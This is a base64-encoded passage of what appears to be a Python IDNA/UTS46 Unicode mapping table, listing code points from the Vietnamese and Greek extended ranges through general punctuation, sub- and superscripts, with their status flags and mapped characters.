JyksXG4gICAgKDB4MUVDRiwgXCdWXCcpLFxuICAgICgweDFFRDAsIFwnTVwnLCBcJ1x4ZTFceGJiXHg5MVwnKSxcbiAgICAoMHgxRUQxLCBcJ1ZcJyksXG4gICAgKDB4MUVEMiwgXCdNXCcsIFwnXHhlMVx4YmJceDkzXCcpLFxuICAgICgweDFFRDMsIFwnVlwnKSxcbiAgICAoMHgxRUQ0LCBcJ01cJywgXCdceGUxXHhiYlx4OTVcJyksXG4gICAgKDB4MUVENSwgXCdWXCcpLFxuICAgICgweDFFRDYsIFwnTVwnLCBcJ1x4ZTFceGJiXHg5N1wnKSxcbiAgICAoMHgxRUQ3LCBcJ1ZcJyksXG4gICAgKDB4MUVEOCwgXCdNXCcsIFwnXHhlMVx4YmJceDk5XCcpLFxuICAgICgweDFFRDksIFwnVlwnKSxcbiAgICAoMHgxRURBLCBcJ01cJywgXCdceGUxXHhiYlx4OWJcJyksXG4gICAgKDB4MUVEQiwgXCdWXCcpLFxuICAgICgweDFFREMsIFwnTVwnLCBcJ1x4ZTFceGJiXHg5ZFwnKSxcbiAgICAoMHgxRURELCBcJ1ZcJyksXG4gICAgKDB4MUVERSwgXCdNXCcsIFwnXHhlMVx4YmJceDlmXCcpLFxuICAgICgweDFFREYsIFwnVlwnKSxcbiAgICAoMHgxRUUwLCBcJ01cJywgXCdceGUxXHhiYlx4YTFcJyksXG4gICAgKDB4MUVFMSwgXCdWXCcpLFxuICAgICgweDFFRTIsIFwnTVwnLCBcJ1x4ZTFceGJiXHhhM1wnKSxcbiAgICAoMHgxRUUzLCBcJ1ZcJyksXG4gICAgKDB4MUVFNCwgXCdNXCcsIFwnXHhlMVx4YmJceGE1XCcpLFxuICAgICgweDFFRTUsIFwnVlwnKSxcbiAgICAoMHgxRUU2LCBcJ01cJywgXCdceGUxXHhiYlx4YTdcJyksXG4gICAgKDB4MUVFNywgXCdWXCcpLFxuICAgICgweDFFRTgsIFwnTVwnLCBcJ1x4ZTFceGJiXHhhOVwnKSxcbiAgICAoMHgxRUU5LCBcJ1ZcJyksXG4gICAgKDB4MUVFQSwgXCdNXCcsIFwnXHhlMVx4YmJceGFiXCcpLFxuICAgICgweDFFRUIsIFwnVlwnKSxcbiAgICAoMHgxRUVDLCBcJ01cJywgXCdceGUxXHhiYlx4YWRcJyksXG4gICAgKDB4MUVFRCwgXCdWXCcpLFxuICAgICgweDFFRUUsIFwnTVwnLCBcJ1x4ZTFceGJiXHhhZlwnKSxcbiAgICAoMHgxRUVGLCBcJ1ZcJyksXG4gICAgKDB4MUVGMCwgXCdNXCcsIFwnXHhlMVx4YmJceGIxXCcpLFxuICAgIF1cblxuZGVmIF9zZWdfMTkoKSAtPiBMaXN0W1VuaW9uW1R1cGxlW2ludCwgc3RyXSwgVHVwbGVbaW50LCBzdHIsIHN0cl1dXTpcbiAgICByZXR1cm4gW1xuICAgICgweDFFRjEsIFwnVlwnKSxcbiAgICAoMHgxRUYyLCBcJ01cJywgXCdceGUxXHhiYlx4YjNcJyksXG4gICAgKDB4MUVGMywgXCdWXCcpLFxuICAgICgweDFFRjQsIFwnTVwnLCBcJ1x4ZTFceGJiXHhiNVwnKSxcbiAgICAoMHgxRUY1LCBcJ1ZcJyksXG4gICAgKDB4MUVGNiwgXCdNXCcsIFwnXHhlMVx4YmJceGI3XCcpLFxuICAgICgweDFFRjcsIFwnVlwnKSxcbiAgICAoMHgxRUY4LCBcJ01cJywgXCdceGUxXHhiYlx4YjlcJyksXG4gICAgKDB4MUVGOSwgXCdWXCcpLFxuICAgICgweDFFRkEsIFwnTVwnLCBcJ1x4ZTFceGJiXHhiYlwnKSxcbiAgICAoMHgxRUZCLCBcJ1ZcJyksXG4gICAgKDB4MUVGQywgXCdNXCcsIFwnXHhlMVx4YmJceGJkXCcpLFxuICAgICgweDFFRkQsIFwnVlwnKSxcbiAgICAoMHgxRUZFLCBcJ01cJywgXCdceGUxXHhiYlx4YmZcJyksXG4gICAgKDB4MUVGRiwgXCdWXCcpLFxuICAgICgweDFGMDgsIFwnTVwnLCBcJ1x4ZTFceGJjXHg4MFwnKSxcbiAgICAoMHgxRjA5LCBcJ01cJywgXCdceGUxXHhiY1x4ODFcJyksXG4gICAgKDB4MUYwQSwgXCdNXCcsIFwnXHhlMVx4YmNceDgyXCcpLFxuICAgICgweDFGMEIsIFwnTVwnLCBcJ1x4ZTFceGJjXHg4M1wnKSxcbiAgICAoMHgxRjBDLCBcJ01cJywgXCdceGUxXHhiY1x4ODRcJyksXG4gICAgKDB4MUYwRCwgXCdNXCcsIFwnXHhlMVx4YmNceDg1XCcpLFxuICAgICgweDFGMEUsIFwnTVwnLCBcJ1x4ZTFceGJjXHg4NlwnKSxcbiAgICAoMHgxRjBGLCBcJ01cJywgXCdceGUxXHhiY1x4ODdcJyksXG4gICAgKDB4MUYxMCwgXCdWXCcpLFxuICAgICgweDFGMTYsIFwnWFwnKSxcbiAgICAoMHgxRjE4LCBcJ01cJywgXCdceGUxXHhiY1x4OTBcJyksXG4gICAgKDB4MUYxOSwgXCdNXCcsIFwnXHhlMVx4YmNceDkxXCcpLFxuICAgICgweDFGMUEsIFwnTVwnLCBcJ1x4ZTFceGJjXHg5MlwnKSxcbiAgICAoMHgxRjFCLCBcJ01cJywgXCdceGUxXHhiY1x4OTNcJyksXG4gICAgKDB4MUYxQywgXCdNXCcsIFwnXHhlMVx4YmNceDk0XCcpLFxuICAgICgweDFGMUQsIFwnTVwnLCBcJ1x4ZTFceGJjXHg5NVwnKSxcbiAgICAoMHgxRjFFLCBcJ1hcJyksXG4gICAgKDB4MUYyMCwgXCdWXCcpLFxuICAgICgweDFGMjgsIFwnTVwnLCBcJ1x4ZTFceGJjXHhhMFwnKSxcbiAgICAoMHgxRjI5LCBcJ01cJywgXCdceGUxXHhiY1x4YTFcJyksXG4gICAgKDB4MUYyQSwgXCdNXCcsIFwnXHhlMVx4YmNceGEyXCcpLFxuICAgICgweDFGMkIsIFwnTVwnLCBcJ1x4ZTFceGJjXHhhM1wnKSxcbiAgICAoMHgxRjJDLCBcJ01cJywgXCdceGUxXHhiY1x4YTRcJyksXG4gICAgKDB4MUYyRCwgXCdNXCcsIFwnXHhlMVx4YmNceGE1XCcpLFxuICAgICgweDFGMkUsIFwnTVwnLCBcJ1x4ZTFceGJjXHhhNlwnKSxcbiAgICAoMHgxRjJGLCBcJ01cJywgXCdceGUxXHhiY1x4YTdcJyksXG4gICAgKDB4MUYzMCwgXCdWXCcpLFxuICAgICgweDFGMzgsIFwnTVwnLCBcJ1x4ZTFceGJjXHhiMFwnKSxcbiAgICAoMHgxRjM5LCBcJ01cJywgXCdceGUxXHhiY1x4YjFcJyksXG4gICAgKDB4MUYzQSwgXCdNXCcsIFwnXHhlMVx4YmNceGIyXCcpLFxuICAgICgweDFGM0IsIFwnTVwnLCBcJ1x4ZTFceGJjXHhiM1wnKSxcbiAgICAoMHgxRjNDLCBcJ01cJywgXCdceGUxXHhiY1x4YjRcJyksXG4gICAgKDB4MUYzRCwgXCdNXCcsIFwnXHhlMVx4YmNceGI1XCcpLFxuICAgICgweDFGM0UsIFwnTVwnLCBcJ1x4ZTFceGJjXHhiNlwnKSxcbiAgICAoMHgxRjNGLCBcJ01cJywgXCdceGUxXHhiY1x4YjdcJyksXG4gICAgKDB4MUY0MCwgXCdWXCcpLFxuICAgICgweDFGNDYsIFwnWFwnKSxcbiAgICAoMHgxRjQ4LCBcJ01cJywgXCdceGUxXHhiZFx4ODBcJyksXG4gICAgKDB4MUY0OSwgXCdNXCcsIFwnXHhlMVx4YmRceDgxXCcpLFxuICAgICgweDFGNEEsIFwnTVwnLCBcJ1x4ZTFceGJkXHg4MlwnKSxcbiAgICAoMHgxRjRCLCBcJ01cJywgXCdceGUxXHhiZFx4ODNcJyksXG4gICAgKDB4MUY0QywgXCdNXCcsIFwnXHhlMVx4YmRceDg0XCcpLFxuICAgICgweDFGNEQsIFwnTVwnLCBcJ1x4ZTFceGJkXHg4NVwnKSxcbiAgICAoMHgxRjRFLCBcJ1hcJyksXG4gICAgKDB4MUY1MCwgXCdWXCcpLFxuICAgICgweDFGNTgsIFwnWFwnKSxcbiAgICAoMHgxRjU5LCBcJ01cJywgXCdceGUxXHhiZFx4OTFcJyksXG4gICAgKDB4MUY1QSwgXCdYXCcpLFxuICAgICgweDFGNUIsIFwnTVwnLCBcJ1x4ZTFceGJkXHg5M1wnKSxcbiAgICAoMHgxRjVDLCBcJ1hcJyksXG4gICAgKDB4MUY1RCwgXCdNXCcsIFwnXHhlMVx4YmRceDk1XCcpLFxuICAgICgweDFGNUUsIFwnWFwnKSxcbiAgICAoMHgxRjVGLCBcJ01cJywgXCdceGUxXHhiZFx4OTdcJyksXG4gICAgKDB4MUY2MCwgXCdWXCcpLFxuICAgICgweDFGNjgsIFwnTVwnLCBcJ1x4ZTFceGJkXHhhMFwnKSxcbiAgICAoMHgxRjY5LCBcJ01cJywgXCdceGUxXHhiZFx4YTFcJyksXG4gICAgKDB4MUY2QSwgXCdNXCcsIFwnXHhlMVx4YmRceGEyXCcpLFxuICAgICgweDFGNkIsIFwnTVwnLCBcJ1x4ZTFceGJkXHhhM1wnKSxcbiAgICAoMHgxRjZDLCBcJ01cJywgXCdceGUxXHhiZFx4YTRcJyksXG4gICAgKDB4MUY2RCwgXCdNXCcsIFwnXHhlMVx4YmRceGE1XCcpLFxuICAgICgweDFGNkUsIFwnTVwnLCBcJ1x4ZTFceGJkXHhhNlwnKSxcbiAgICAoMHgxRjZGLCBcJ01cJywgXCdceGUxXHhiZFx4YTdcJyksXG4gICAgKDB4MUY3MCwgXCdWXCcpLFxuICAgICgweDFGNzEsIFwnTVwnLCBcJ1x4Y2VceGFjXCcpLFxuICAgICgweDFGNzIsIFwnVlwnKSxcbiAgICAoMHgxRjczLCBcJ01cJywgXCdceGNlXHhhZFwnKSxcbiAgICAoMHgxRjc0LCBcJ1ZcJyksXG4gICAgKDB4MUY3NSwgXCdNXCcsIFwnXHhjZVx4YWVcJyksXG4gICAgKDB4MUY3NiwgXCdWXCcpLFxuICAgICgweDFGNzcsIFwnTVwnLCBcJ1x4Y2VceGFmXCcpLFxuICAgICgweDFGNzgsIFwnVlwnKSxcbiAgICAoMHgxRjc5LCBcJ01cJywgXCdceGNmXHg4Y1wnKSxcbiAgICAoMHgxRjdBLCBcJ1ZcJyksXG4gICAgKDB4MUY3QiwgXCdNXCcsIFwnXHhjZlx4OGRcJyksXG4gICAgKDB4MUY3QywgXCdWXCcpLFxuICAgICgweDFGN0QsIFwnTVwnLCBcJ1x4Y2ZceDhlXCcpLFxuICAgICgweDFGN0UsIFwnWFwnKSxcbiAgICAoMHgxRjgwLCBcJ01cJywgXCdceGUxXHhiY1x4ODBceGNlXHhiOVwnKSxcbiAgICAoMHgxRjgxLCBcJ01cJywgXCdceGUxXHhiY1x4ODFceGNlXHhiOVwnKSxcbiAgICAoMHgxRjgyLCBcJ01cJywgXCdceGUxXHhiY1x4ODJceGNlXHhiOVwnKSxcbiAgICAoMHgxRjgzLCBcJ01cJywgXCdceGUxXHhiY1x4ODNceGNlXHhiOVwnKSxcbiAgICAoMHgxRjg0LCBcJ01cJywgXCdceGUxXHhiY1x4ODRceGNlXHhiOVwnKSxcbiAgICAoMHgxRjg1LCBcJ01cJywgXCdceGUxXHhiY1x4ODVceGNlXHhiOVwnKSxcbiAgICAoMHgxRjg2LCBcJ01cJywgXCdceGUxXHhiY1x4ODZceGNlXHhiOVwnKSxcbiAgICAoMHgxRjg3LCBcJ01cJywgXCdceGUxXHhiY1x4ODdceGNlXHhiOVwnKSxcbiAgICBdXG5cbmRlZiBfc2VnXzIwKCkgLT4gTGlzdFtVbmlvbltUdXBsZVtpbnQsIHN0cl0sIFR1cGxlW2ludCwgc3RyLCBzdHJdXV06XG4gICAgcmV0dXJuIFtcbiAgICAoMHgxRjg4LCBcJ01cJywgXCdceGUxXHhiY1x4ODBceGNlXHhiOVwnKSxcbiAgICAoMHgxRjg5LCBcJ01cJywgXCdceGUxXHhiY1x4ODFceGNlXHhiOVwnKSxcbiAgICAoMHgxRjhBLCBcJ01cJywgXCdceGUxXHhiY1x4ODJceGNlXHhiOVwnKSxcbiAgICAoMHgxRjhCLCBcJ01cJywgXCdceGUxXHhiY1x4ODNceGNlXHhiOVwnKSxcbiAgICAoMHgxRjhDLCBcJ01cJywgXCdceGUxXHhiY1x4ODRceGNlXHhiOVwnKSxcbiAgICAoMHgxRjhELCBcJ01cJywgXCdceGUxXHhiY1x4ODVceGNlXHhiOVwnKSxcbiAgICAoMHgxRjhFLCBcJ01cJywgXCdceGUxXHhiY1x4ODZceGNlXHhiOVwnKSxcbiAgICAoMHgxRjhGLCBcJ01cJywgXCdceGUxXHhiY1x4ODdceGNlXHhiOVwnKSxcbiAgICAoMHgxRjkwLCBcJ01cJywgXCdceGUxXHhiY1x4YTBceGNlXHhiOVwnKSxcbiAgICAoMHgxRjkxLCBcJ01cJywgXCdceGUxXHhiY1x4YTFceGNlXHhiOVwnKSxcbiAgICAoMHgxRjkyLCBcJ01cJywgXCdceGUxXHhiY1x4YTJceGNlXHhiOVwnKSxcbiAgICAoMHgxRjkzLCBcJ01cJywgXCdceGUxXHhiY1x4YTNceGNlXHhiOVwnKSxcbiAgICAoMHgxRjk0LCBcJ01cJywgXCdceGUxXHhiY1x4YTRceGNlXHhiOVwnKSxcbiAgICAoMHgxRjk1LCBcJ01cJywgXCdceGUxXHhiY1x4YTVceGNlXHhiOVwnKSxcbiAgICAoMHgxRjk2LCBcJ01cJywgXCdceGUxXHhiY1x4YTZceGNlXHhiOVwnKSxcbiAgICAoMHgxRjk3LCBcJ01cJywgXCdceGUxXHhiY1x4YTdceGNlXHhiOVwnKSxcbiAgICAoMHgxRjk4LCBcJ01cJywgXCdceGUxXHhiY1x4YTBceGNlXHhiOVwnKSxcbiAgICAoMHgxRjk5LCBcJ01cJywgXCdceGUxXHhiY1x4YTFceGNlXHhiOVwnKSxcbiAgICAoMHgxRjlBLCBcJ01cJywgXCdceGUxXHhiY1x4YTJceGNlXHhiOVwnKSxcbiAgICAoMHgxRjlCLCBcJ01cJywgXCdceGUxXHhiY1x4YTNceGNlXHhiOVwnKSxcbiAgICAoMHgxRjlDLCBcJ01cJywgXCdceGUxXHhiY1x4YTRceGNlXHhiOVwnKSxcbiAgICAoMHgxRjlELCBcJ01cJywgXCdceGUxXHhiY1x4YTVceGNlXHhiOVwnKSxcbiAgICAoMHgxRjlFLCBcJ01cJywgXCdceGUxXHhiY1x4YTZceGNlXHhiOVwnKSxcbiAgICAoMHgxRjlGLCBcJ01cJywgXCdceGUxXHhiY1x4YTdceGNlXHhiOVwnKSxcbiAgICAoMHgxRkEwLCBcJ01cJywgXCdceGUxXHhiZFx4YTBceGNlXHhiOVwnKSxcbiAgICAoMHgxRkExLCBcJ01cJywgXCdceGUxXHhiZFx4YTFceGNlXHhiOVwnKSxcbiAgICAoMHgxRkEyLCBcJ01cJywgXCdceGUxXHhiZFx4YTJceGNlXHhiOVwnKSxcbiAgICAoMHgxRkEzLCBcJ01cJywgXCdceGUxXHhiZFx4YTNceGNlXHhiOVwnKSxcbiAgICAoMHgxRkE0LCBcJ01cJywgXCdceGUxXHhiZFx4YTRceGNlXHhiOVwnKSxcbiAgICAoMHgxRkE1LCBcJ01cJywgXCdceGUxXHhiZFx4YTVceGNlXHhiOVwnKSxcbiAgICAoMHgxRkE2LCBcJ01cJywgXCdceGUxXHhiZFx4YTZceGNlXHhiOVwnKSxcbiAgICAoMHgxRkE3LCBcJ01cJywgXCdceGUxXHhiZFx4YTdceGNlXHhiOVwnKSxcbiAgICAoMHgxRkE4LCBcJ01cJywgXCdceGUxXHhiZFx4YTBceGNlXHhiOVwnKSxcbiAgICAoMHgxRkE5LCBcJ01cJywgXCdceGUxXHhiZFx4YTFceGNlXHhiOVwnKSxcbiAgICAoMHgxRkFBLCBcJ01cJywgXCdceGUxXHhiZFx4YTJceGNlXHhiOVwnKSxcbiAgICAoMHgxRkFCLCBcJ01cJywgXCdceGUxXHhiZFx4YTNceGNlXHhiOVwnKSxcbiAgICAoMHgxRkFDLCBcJ01cJywgXCdceGUxXHhiZFx4YTRceGNlXHhiOVwnKSxcbiAgICAoMHgxRkFELCBcJ01cJywgXCdceGUxXHhiZFx4YTVceGNlXHhiOVwnKSxcbiAgICAoMHgxRkFFLCBcJ01cJywgXCdceGUxXHhiZFx4YTZceGNlXHhiOVwnKSxcbiAgICAoMHgxRkFGLCBcJ01cJywgXCdceGUxXHhiZFx4YTdceGNlXHhiOVwnKSxcbiAgICAoMHgxRkIwLCBcJ1ZcJyksXG4gICAgKDB4MUZCMiwgXCdNXCcsIFwnXHhlMVx4YmRceGIwXHhjZVx4YjlcJyksXG4gICAgKDB4MUZCMywgXCdNXCcsIFwnXHhjZVx4YjFceGNlXHhiOVwnKSxcbiAgICAoMHgxRkI0LCBcJ01cJywgXCdceGNlXHhhY1x4Y2VceGI5XCcpLFxuICAgICgweDFGQjUsIFwnWFwnKSxcbiAgICAoMHgxRkI2LCBcJ1ZcJyksXG4gICAgKDB4MUZCNywgXCdNXCcsIFwnXHhlMVx4YmVceGI2XHhjZVx4YjlcJyksXG4gICAgKDB4MUZCOCwgXCdNXCcsIFwnXHhlMVx4YmVceGIwXCcpLFxuICAgICgweDFGQjksIFwnTVwnLCBcJ1x4ZTFceGJlXHhiMVwnKSxcbiAgICAoMHgxRkJBLCBcJ01cJywgXCdceGUxXHhiZFx4YjBcJyksXG4gICAgKDB4MUZCQiwgXCdNXCcsIFwnXHhjZVx4YWNcJyksXG4gICAgKDB4MUZCQywgXCdNXCcsIFwnXHhjZVx4YjFceGNlXHhiOVwnKSxcbiAgICAoMHgxRkJELCBcJzNcJywgXCcgXHhjY1x4OTNcJyksXG4gICAgKDB4MUZCRSwgXCdNXCcsIFwnXHhjZVx4YjlcJyksXG4gICAgKDB4MUZCRiwgXCczXCcsIFwnIFx4Y2NceDkzXCcpLFxuICAgICgweDFGQzAsIFwnM1wnLCBcJyBceGNkXHg4MlwnKSxcbiAgICAoMHgxRkMxLCBcJzNcJywgXCcgXHhjY1x4ODhceGNkXHg4MlwnKSxcbiAgICAoMHgxRkMyLCBcJ01cJywgXCdceGUxXHhiZFx4YjRceGNlXHhiOVwnKSxcbiAgICAoMHgxRkMzLCBcJ01cJywgXCdceGNlXHhiN1x4Y2VceGI5XCcpLFxuICAgICgweDFGQzQsIFwnTVwnLCBcJ1x4Y2VceGFlXHhjZVx4YjlcJyksXG4gICAgKDB4MUZDNSwgXCdYXCcpLFxuICAgICgweDFGQzYsIFwnVlwnKSxcbiAgICAoMHgxRkM3LCBcJ01cJywgXCdceGUxXHhiZlx4ODZceGNlXHhiOVwnKSxcbiAgICAoMHgxRkM4LCBcJ01cJywgXCdceGUxXHhiZFx4YjJcJyksXG4gICAgKDB4MUZDOSwgXCdNXCcsIFwnXHhjZVx4YWRcJyksXG4gICAgKDB4MUZDQSwgXCdNXCcsIFwnXHhlMVx4YmRceGI0XCcpLFxuICAgICgweDFGQ0IsIFwnTVwnLCBcJ1x4Y2VceGFlXCcpLFxuICAgICgweDFGQ0MsIFwnTVwnLCBcJ1x4Y2VceGI3XHhjZVx4YjlcJyksXG4gICAgKDB4MUZDRCwgXCczXCcsIFwnIFx4Y2NceDkzXHhjY1x4ODBcJyksXG4gICAgKDB4MUZDRSwgXCczXCcsIFwnIFx4Y2NceDkzXHhjY1x4ODFcJyksXG4gICAgKDB4MUZDRiwgXCczXCcsIFwnIFx4Y2NceDkzXHhjZFx4ODJcJyksXG4gICAgKDB4MUZEMCwgXCdWXCcpLFxuICAgICgweDFGRDMsIFwnTVwnLCBcJ1x4Y2VceDkwXCcpLFxuICAgICgweDFGRDQsIFwnWFwnKSxcbiAgICAoMHgxRkQ2LCBcJ1ZcJyksXG4gICAgKDB4MUZEOCwgXCdNXCcsIFwnXHhlMVx4YmZceDkwXCcpLFxuICAgICgweDFGRDksIFwnTVwnLCBcJ1x4ZTFceGJmXHg5MVwnKSxcbiAgICAoMHgxRkRBLCBcJ01cJywgXCdceGUxXHhiZFx4YjZcJyksXG4gICAgKDB4MUZEQiwgXCdNXCcsIFwnXHhjZVx4YWZcJyksXG4gICAgKDB4MUZEQywgXCdYXCcpLFxuICAgICgweDFGREQsIFwnM1wnLCBcJyBceGNjXHg5NFx4Y2NceDgwXCcpLFxuICAgICgweDFGREUsIFwnM1wnLCBcJyBceGNjXHg5NFx4Y2NceDgxXCcpLFxuICAgICgweDFGREYsIFwnM1wnLCBcJyBceGNjXHg5NFx4Y2RceDgyXCcpLFxuICAgICgweDFGRTAsIFwnVlwnKSxcbiAgICAoMHgxRkUzLCBcJ01cJywgXCdceGNlXHhiMFwnKSxcbiAgICAoMHgxRkU0LCBcJ1ZcJyksXG4gICAgKDB4MUZFOCwgXCdNXCcsIFwnXHhlMVx4YmZceGEwXCcpLFxuICAgICgweDFGRTksIFwnTVwnLCBcJ1x4ZTFceGJmXHhhMVwnKSxcbiAgICAoMHgxRkVBLCBcJ01cJywgXCdceGUxXHhiZFx4YmFcJyksXG4gICAgKDB4MUZFQiwgXCdNXCcsIFwnXHhjZlx4OGRcJyksXG4gICAgKDB4MUZFQywgXCdNXCcsIFwnXHhlMVx4YmZceGE1XCcpLFxuICAgICgweDFGRUQsIFwnM1wnLCBcJyBceGNjXHg4OFx4Y2NceDgwXCcpLFxuICAgICgweDFGRUUsIFwnM1wnLCBcJyBceGNjXHg4OFx4Y2NceDgxXCcpLFxuICAgICgweDFGRUYsIFwnM1wnLCBcJ2BcJyksXG4gICAgKDB4MUZGMCwgXCdYXCcpLFxuICAgICgweDFGRjIsIFwnTVwnLCBcJ1x4ZTFceGJkXHhiY1x4Y2VceGI5XCcpLFxuICAgICgweDFGRjMsIFwnTVwnLCBcJ1x4Y2ZceDg5XHhjZVx4YjlcJyksXG4gICAgKDB4MUZGNCwgXCdNXCcsIFwnXHhjZlx4OGVceGNlXHhiOVwnKSxcbiAgICAoMHgxRkY1LCBcJ1hcJyksXG4gICAgKDB4MUZGNiwgXCdWXCcpLFxuICAgIF1cblxuZGVmIF9zZWdfMjEoKSAtPiBMaXN0W1VuaW9uW1R1cGxlW2ludCwgc3RyXSwgVHVwbGVbaW50LCBzdHIsIHN0cl1dXTpcbiAgICByZXR1cm4gW1xuICAgICgweDFGRjcsIFwnTVwnLCBcJ1x4ZTFceGJmXHhiNlx4Y2VceGI5XCcpLFxuICAgICgweDFGRjgsIFwnTVwnLCBcJ1x4ZTFceGJkXHhiOFwnKSxcbiAgICAoMHgxRkY5LCBcJ01cJywgXCdceGNmXHg4Y1wnKSxcbiAgICAoMHgxRkZBLCBcJ01cJywgXCdceGUxXHhiZFx4YmNcJyksXG4gICAgKDB4MUZGQiwgXCdNXCcsIFwnXHhjZlx4OGVcJyksXG4gICAgKDB4MUZGQywgXCdNXCcsIFwnXHhjZlx4ODlceGNlXHhiOVwnKSxcbiAgICAoMHgxRkZELCBcJzNcJywgXCcgXHhjY1x4ODFcJyksXG4gICAgKDB4MUZGRSwgXCczXCcsIFwnIFx4Y2NceDk0XCcpLFxuICAgICgweDFGRkYsIFwnWFwnKSxcbiAgICAoMHgyMDAwLCBcJzNcJywgXCcgXCcpLFxuICAgICgweDIwMEIsIFwnSVwnKSxcbiAgICAoMHgyMDBDLCBcJ0RcJywgXCdcJyksXG4gICAgKDB4MjAwRSwgXCdYXCcpLFxuICAgICgweDIwMTAsIFwnVlwnKSxcbiAgICAoMHgyMDExLCBcJ01cJywgXCdceGUyXHg4MFx4OTBcJyksXG4gICAgKDB4MjAxMiwgXCdWXCcpLFxuICAgICgweDIwMTcsIFwnM1wnLCBcJyBceGNjXHhiM1wnKSxcbiAgICAoMHgyMDE4LCBcJ1ZcJyksXG4gICAgKDB4MjAyNCwgXCdYXCcpLFxuICAgICgweDIwMjcsIFwnVlwnKSxcbiAgICAoMHgyMDI4LCBcJ1hcJyksXG4gICAgKDB4MjAyRiwgXCczXCcsIFwnIFwnKSxcbiAgICAoMHgyMDMwLCBcJ1ZcJyksXG4gICAgKDB4MjAzMywgXCdNXCcsIFwnXHhlMlx4ODBceGIyXHhlMlx4ODBceGIyXCcpLFxuICAgICgweDIwMzQsIFwnTVwnLCBcJ1x4ZTJceDgwXHhiMlx4ZTJceDgwXHhiMlx4ZTJceDgwXHhiMlwnKSxcbiAgICAoMHgyMDM1LCBcJ1ZcJyksXG4gICAgKDB4MjAzNiwgXCdNXCcsIFwnXHhlMlx4ODBceGI1XHhlMlx4ODBceGI1XCcpLFxuICAgICgweDIwMzcsIFwnTVwnLCBcJ1x4ZTJceDgwXHhiNVx4ZTJceDgwXHhiNVx4ZTJceDgwXHhiNVwnKSxcbiAgICAoMHgyMDM4LCBcJ1ZcJyksXG4gICAgKDB4MjAzQywgXCczXCcsIFwnISFcJyksXG4gICAgKDB4MjAzRCwgXCdWXCcpLFxuICAgICgweDIwM0UsIFwnM1wnLCBcJyBceGNjXHg4NVwnKSxcbiAgICAoMHgyMDNGLCBcJ1ZcJyksXG4gICAgKDB4MjA0NywgXCczXCcsIFwnPz9cJyksXG4gICAgKDB4MjA0OCwgXCczXCcsIFwnPyFcJyksXG4gICAgKDB4MjA0OSwgXCczXCcsIFwnIT9cJyksXG4gICAgKDB4MjA0QSwgXCdWXCcpLFxuICAgICgweDIwNTcsIFwnTVwnLCBcJ1x4ZTJceDgwXHhiMlx4ZTJceDgwXHhiMlx4ZTJceDgwXHhiMlx4ZTJceDgwXHhiMlwnKSxcbiAgICAoMHgyMDU4LCBcJ1ZcJyksXG4gICAgKDB4MjA1RiwgXCczXCcsIFwnIFwnKSxcbiAgICAoMHgyMDYwLCBcJ0lcJyksXG4gICAgKDB4MjA2MSwgXCdYXCcpLFxuICAgICgweDIwNjQsIFwnSVwnKSxcbiAgICAoMHgyMDY1LCBcJ1hcJyksXG4gICAgKDB4MjA3MCwgXCdNXCcsIFwnMFwnKSxcbiAgICAoMHgyMDcxLCBcJ01cJywgXCdpXCcpLFxuICAgICgweDIwNzIsIFwnWFwnKSxcbiAgICAoMHgyMDc0LCBcJ01cJywgXCc0XCcpLFxuICAgICgweDIwNzUsIFwnTVwnLCBcJzVcJyksXG4gICAgKDB4MjA3NiwgXCdNXCcsIFwnNlwnKSxcbiAgICAoMHgyMDc3LCBcJ01cJywgXCc3XCcpLFxuICAgICgweDIwNzgsIFwnTVwnLCBcJzhcJyksXG4gICAgKDB4MjA3OSwgXCdNXCcsIFwnOVwnKSxcbiAgICAoMHgyMDdBLCBcJzNcJywgXCcrXCcpLFxuICAgICgweDIwN0IsIFwnTVwnLCBcJ1x4ZTJceDg4XHg5MlwnKSxcbiAgICAoMHgyMDdDLCBcJzNcJywgXCc9XCcpLFxuICAgICgweDIwN0QsIFwnM1wnLCBcJyhcJyksXG4gICAgKDB4MjA3RSwgXCczXCcsIFwnKVwnKSxcbiAgICAoMHgyMDdGLCBcJ01cJywgXCduXCcpLFxuICAgICgweDIwODAsIFwnTVwnLCBcJzBcJyksXG4gICAgKDB4MjA4MSwgXCdNXCcsIFwnMVwnKSxcbiAgICAoMHgyMDgyLCBcJ01cJywgXCcyXCcpLFxuICAgICgweDIwODMsIFwnTVwnLCBcJzNcJyksXG4gICAgKDB4MjA4NCwgXCdNXCcsIFwnNFwnKSxcbiAgICAoMHgyMDg1LCBcJ01cJywgXCc1XCcpLFxuICAgICgweDIwODYsIFwnTVwnLCBcJzZcJyksXG4gICAgKDB4MjA4NywgXCdNXCcsIFwnN1wnKSxcbiAgICAoMHgyMDg4LCBcJ01cJywgXCc4XCcpLFxuICAgICgweDIwODksIFwnTVwnLCBcJzlcJyksXG4gICAgKDB4MjA4QSwgXCczXCcsIFwnK1wnKSxcbiAgICAoMHgyMDhCLCBcJ01cJywgXCdceGUyXHg4OFx4OTJcJyksXG4gICAgKDB4MjA4QywgXCczXCcsIFwnPVwnKSxcbiAgICAoMHgyMDhELCBcJzNcJywgXCcoXCcpLFxuICAgICgweDIwOEUsIFwnM1wnLCBcJylcJyksXG4gICAgKDB4MjA4RiwgXCdYXCcpLFxuICAgICgweDIwOTAsIFwnTVwnLCBcJ2FcJyksXG4gICAgKDB4MjA5MSwgXCdNXCcsIFwnZVwnKSxcbiAgICAoMHgyMDkyLCBcJ01cJywgXCdvXCcpLFxuICAgICgweDIwOTMsIFwnTVwnLCBcJ3hcJyksXG4gICAgKDB4MjA5NCwgXCdNXCcsIFwnXHhjOVx4OTlcJyksXG4gICAgKDB4MjA5NSwgXCdNXCcsIFwnaFwnKSxcbiAgICAoMHgyMDk2LCBcJ01cJywgXCdrXCcpLFxuICAgICgweDIwOTcsIFwnTVwnLCBcJ2xcJyksXG4gICAgKDB4MjA5OCwgXCdNXCcsIFwnbVwnKSxcbiAgICAoMHgyMDk5LCBcJ01cJywgXCduXCcpLFxuICAgICgweDIwOUEsIFwnTVwnLCBcJ3BcJyksXG4gICAgKDB4MjA5QiwgXCdNXCcsIFwnc1wnKSxcbiAgICAoMHgyMDlDLCBcJ01cJywgXCd0XCcpLFxuICAgICgweDIwOUQsIFwnWFwnKSxcbiAgICAoMHgyMEEwLCBcJ1ZcJyksXG4gICAgKDB4MjBBOCwgXCdNXCcsIFwncnNcJyksXG4gICAgKDB4MjBBOSwgXCdWXCcpLFxuICAgICgweDIwQzEsIFwnWFwnKSxcbiAgICAoMHgyMEQwLCBcJ1ZcJyksXG4gICAgKDB4MjBGMSwgXCdYXCcpLFxuICAgICgweDIxMDAsIFwnM1wnLCBcJ2EvY1wnKSxcbiAgICAoMHgyMTAxLCBcJzNcJywgXCdhL3NcJyksXG4gICAgKDB4MjEwMiwg